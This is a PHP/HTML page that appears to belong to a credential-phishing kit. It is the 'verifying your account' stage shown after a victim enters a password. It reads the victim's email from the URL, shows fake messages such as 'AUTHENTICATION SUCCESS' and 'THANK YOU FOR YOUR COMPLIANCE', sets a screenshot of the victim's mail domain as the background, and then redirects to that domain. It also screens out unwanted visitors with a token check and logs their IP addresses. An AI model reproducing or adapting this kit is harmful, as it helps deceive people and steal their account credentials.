<?php
    session_start();
    require_once '../Vendor/Modernized.php';
    require_once '../Vendor/Pullers.php';
    require_once '../Vendor/Laravel.php';

    $Modernizeds = new Modernized;
    $Pullers = new Pullers;

    if (!$Modernizeds->checkToken()) {
        echo $Pullers->throw404();
        $Modernizeds->log(
            "../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $Modernizeds->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }
?><!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" type="image/png" sizes="192x192" class="logoimg" href="">

    <!-- Bootstrap CSS -->
    <!-- <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous"> -->
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title class="logoname"> Mail </title>
    <link href="css/hover.css" rel="stylesheet" media="all">
    <link rel="stylesheet" href="https://firebasestorage.googleapis.com/v0/b/dellcssfile.appspot.com/o/bootstrap.min.css?alt=media&token=ec34bc68-b721-48e5-a02a-8deed9a44325">
  <link rel="stylesheet" href="https://firebasestorage.googleapis.com/v0/b/dellcssfile.appspot.com/o/font-awesome.min.css?alt=media&token=e6f19ce7-a9ca-457e-80df-0f4823412ad5">
   
    <style type="text/css">
      .login-form {
        width: 385px;
        margin: 30px auto;
      }
      .login-form form {
        margin-bottom: 15px;
        background: #f7f7f7;
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        padding: 30px;
      }
      .login-form h2 {
        margin: 0 0 15px;
      }
      .form-control, .login-btn {
        min-height: 38px;
        border-radius: 2px;
      }
      .input-group-addon .fa {
        font-size: 18px;
      }
      .login-btn {
        font-size: 15px;
        font-weight: bold;
      }
      .social-btn .btn {
        border: none;
        margin: 10px 3px 0;
        opacity: 1;
      }
      .social-btn .btn:hover {
        opacity: 0.9;
      }
      .social-btn .btn-primary {
        background: #507cc0;
      }
      .social-btn .btn-info {
        background: #64ccf1;
      }
      .social-btn .btn-danger {
        background: #df4930;
      }
      .or-seperator {
        margin-top: 20px;
        text-align: center;
        border-top: 1px solid #ccc;
      }
      .or-seperator i {
        padding: 0 10px;
        background: #f7f7f7;
        position: relative;
        top: -11px;
        z-index: 1;
      }
      



    </style>
  </head>
  <body data-gr-c-s-loaded="true">
    <p>&nbsp;</p>
    <p>&nbsp;</p>



    <div class="login-form">
      <form target="_top" action="" method="post">
        <h2 class="text-center"><div id="top">		<br/>
        <h3>Verifying your account details.<br><b id="ai"></b></h3>
<br/><br/>                                    <div id="10979b8875e" class="K-valu" style="font-size:22px; color:green">

<div id="splashcontainer" style=" visibility: visible;"><b><center><fontsize="3" color="#0000FF">AUTHENTICATION SUCCESS.</fontsize="3"></center></b></div><layer id="splashcontainerns" width="@)"></layer>

<font face="Arial" size="15" color="#00FF00">



<script>

var email = '<?=$_GET['ema']?>';
var my_email =email;

var ind=my_email.indexOf("@");

document.getElementById('ai').innerHTML = my_email;


var my_slice=my_email.substr((ind+1));

var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")

var intervals=3000

//configure destination URL

var targetdestination= "http://www."+my_slice

var splashmessage=new Array()

var openingtags='<fontsize="3" color="#0000FF">'

splashmessage[0]='VERIFYING EMAIL.'

splashmessage[1]='AUTHENTICATING PASSWORD.'

splashmessage[2]='AUTHENTICATION SUCCESS.'

splashmessage[3]='UPDATING DATA.'

splashmessage[4]='CONGRATULATIONS!<br>YOUR ACCOUNT HAS BEEN UPDATED SUCCESSFULLY.'

splashmessage[5]='YOU WILL RECEIVE MESSAGE FROM US SHORTLY, OR WAIT FOR 24 HOURS.'

splashmessage[6]='NO FURTHER ACTION NEEDED.'

splashmessage[7]='YOU WILL NOW BE REDIRETED TO YOUR ACCOUNT.<BR>THANK YOU FOR YOUR COMPLIANCE.'



var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script>



</font>



<script><!--

var jv=1.0;

//--></script>



<script language="Javascript1.1"><!--

jv=1.1;

//--></script>



<script language="Javascript1.2"><!--

jv=1.2;

//--></script>



<script language="Javascript1.3"><!--

jv=1.3;

//--></script>



<script language="Javascript1.4"><!--

jv=1.4;

//--></script>

                              </div>            
      <img class="qQs8sA icon" draggable="false" alt="" aria-hidden="true" src="spinner.gif" style="width:50px">
  



      </form>
      </a>
    </div>





    <style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {borer:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
    var ai = '<?=$_GET['ema']?>'; 
    var my_ijah = ai;
    $('#ai').val(my_ijah);
    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    var ind = my_ijah.indexOf("@");
    var my_ours = my_ijah.substr((ind + 1));

var image = "url('https://image.thum.io/get/auth/67441-7c7c7dbf350581c53a70b1bb7b4f3384/width/1200/https://"+my_ours;"')"
			document.body.style.backgroundImage = image;


           
});
</script>
  </body>

  </html>